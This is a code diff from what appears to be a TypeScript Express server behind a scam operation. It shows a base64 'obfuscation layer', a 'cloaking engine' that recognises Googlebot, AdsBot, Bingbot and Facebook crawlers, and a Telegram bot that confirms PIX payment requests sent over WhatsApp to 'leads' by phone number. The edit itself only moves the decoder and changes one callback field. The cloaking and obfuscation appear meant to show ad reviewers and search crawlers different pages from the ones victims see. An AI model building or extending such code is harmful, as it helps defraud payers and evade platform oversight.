@@ -94,6 +94,9 @@ const corsOptions = {
 app.use(cors(corsOptions));
 app.options("*", cors(corsOptions));
 
+// --- OBFUSCATION LAYER ---
+const _d = (b: string) => Buffer.from(b, 'base64').toString('utf-8');
+
 // --- CLOAKING ENGINE (v5.0) ---
 const BOT_UA_PATTERNS = [
   "googlebot", "adsbot", "bingbot", "yandex", "baiduspider", "facebookexternalhit",
@@ -175,8 +178,6 @@ app.use((req, res, next) => {
 app.use(express.json());
 app.use(express.static(path.join(process.cwd(), 'dist')));
 
-// --- OBFUSCATION LAYER ---
-const _d = (b: string) => Buffer.from(b, 'base64').toString('utf-8');
 
 // Helper to send/edit Telegram messages
 async function sendTelegram(text: string, messageId?: number, replyMarkup?: any) {
@@ -500,7 +501,7 @@ async function startTelegramPolling() {
             const adminMsg = `✅ <b>PIX ENVIADO AO WHATSAPP!</b>\n📱 <b>Lead:</b> <code>${telefone}</code>\n🆔 <b>ID:</b> <code>${transId}</code>`;
             const keyboard = {
               inline_keyboard: [[
-                { text: "🔄 Verificar Pagamento", callback_data: `check_pix:${transId}:${telefone}:${valorNumeric}:${valorTotalEstimado}` },
+                { text: "🔄 Verificar Pagamento", callback_data: `check_pix:${transId}:${telefone}:${valorNumeric}:${valorNumeric}` },
                 { text: "➕ Gerar Novo", callback_data: `/pix ${valorNumeric} ${telefone}` }
               ]]
             };
